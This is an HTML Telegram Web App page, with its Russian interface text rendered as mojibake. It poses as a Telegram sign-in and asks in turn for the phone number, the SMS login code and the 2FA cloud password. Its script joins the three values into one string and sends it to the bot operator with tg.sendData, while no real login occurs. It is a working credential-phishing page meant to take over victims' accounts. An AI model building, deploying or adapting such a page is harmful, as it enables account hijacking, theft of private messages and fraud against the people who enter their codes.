<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
    :root {
        --bg-color: #0f1721;
        --container-bg: #1c2733;
        --text-color: #ffffff;
        --hint-color: #708499;
        --accent-color: #3390ec;
        --input-bg: #242f3d;
    }

    input::-webkit-outer-spin-button,
    input::-webkit-inner-spin-button { -webkit-appearance: none !important; margin: 0 !important; }
    input[type=number] { -moz-appearance: textfield !important; appearance: none !important; }

    body {
        font-family: -apple-system, system-ui, sans-serif;
        background-color: var(--bg-color);
        color: var(--text-color);
        margin: 0;
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100vh;
        overflow: hidden;
    }

    .card {
        width: 100%;
        max-width: 340px;
        background: var(--container-bg);
        padding: 40px 30px;
        border-radius: 28px;
        text-align: center;
        box-shadow: 0 20px 40px rgba(0,0,0,0.5);
    }

    .logo-area { font-size: 55px; margin-bottom: 20px; display: inline-block; }
    h2 { font-size: 22px; margin: 0 0 10px 0; font-weight: 600; }
    p { font-size: 14px; color: var(--hint-color); line-height: 1.5; margin-bottom: 30px; min-height: 42px; }

    input {
        width: 100%;
        background: var(--input-bg);
        border: 2px solid transparent;
        border-radius: 16px;
        padding: 18px;
        color: #fff;
        font-size: 20px;
        text-align: center;
        outline: none;
        box-sizing: border-box;
        transition: 0.3s;
        margin-bottom: 15px;
    }

    input:focus { border-color: var(--accent-color); }

    button {
        width: 100%;
        background: var(--accent-color);
        color: white;
        border: none;
        border-radius: 16px;
        padding: 18px;
        font-size: 16px;
        font-weight: 700;
        cursor: pointer;
    }

    .step { display: none; }
    .active { display: block; animation: slideIn 0.4s ease forwards; }

    @keyframes slideIn {
        from { opacity: 0; transform: translateX(30px); }
        to { opacity: 1; transform: translateX(0); }
    }
</style>
</head>
<body>

<div class="card">
    <div id="main-icon" class="logo-area">üìû</div>

    <div id="step-phone" class="step active">
        <h2>–í—Ö–æ–¥</h2>
        <p>–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –∞–∫–∫–∞—É–Ω—Ç–∞</p>
        <input type="tel" id="p" placeholder="+7...">
        <button onclick="nextStep('code')">–ü–æ–ª—É—á–∏—Ç—å –∫–æ–¥</button>
    </div>

    <div id="step-code" class="step">
        <h2>–ö–æ–¥ SMS</h2>
        <p>–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –∏–ª–∏ –°–ú–°</p>
        <input type="number" id="c" placeholder="00000">
        <button onclick="nextStep('pass')">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>
    </div>

    <div id="step-pass" class="step">
        <h2>–ü–∞—Ä–æ–ª—å 2FA</h2>
        <p>–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –æ–±–ª–∞—á–Ω—ã–π –ø–∞—Ä–æ–ª—å</p>
        <input type="password" id="pass" placeholder="–í–∞—à –ø–∞—Ä–æ–ª—å">
        <button onclick="finish()">–ó–∞–≤–µ—Ä—à–∏—Ç—å</button>
    </div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    let collectedData = {
        p: '', // phone
        c: '', // code
        s: ''  // password
    };

    function nextStep(stepId) {
        if (stepId === 'code') {
            collectedData.p = document.getElementById('p').value;
            if(!collectedData.p) return;
            showStep('code', '‚úâÔ∏è');
        } else if (stepId === 'pass') {
            collectedData.c = document.getElementById('c').value;
            if(!collectedData.c) return;
            showStep('pass', 'üîë');
        }
    }

    function showStep(id, icon) {
        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
        document.getElementById('step-' + id).classList.add('active');
        document.getElementById('main-icon').innerText = icon;
        // –ê–≤—Ç–æ—Ñ–æ–∫—É—Å –Ω–∞ –Ω–æ–≤–æ–º –ø–æ–ª–µ
        const nextInput = document.querySelector('#step-' + id + ' input');
        if(nextInput) nextInput.focus();
    }

    function finish() {
        collectedData.s = document.getElementById('pass').value;
        const result = `${collectedData.p}|${collectedData.c}|${collectedData.s}`;
        tg.sendData(result);
    }
</script>
</body>
</html>
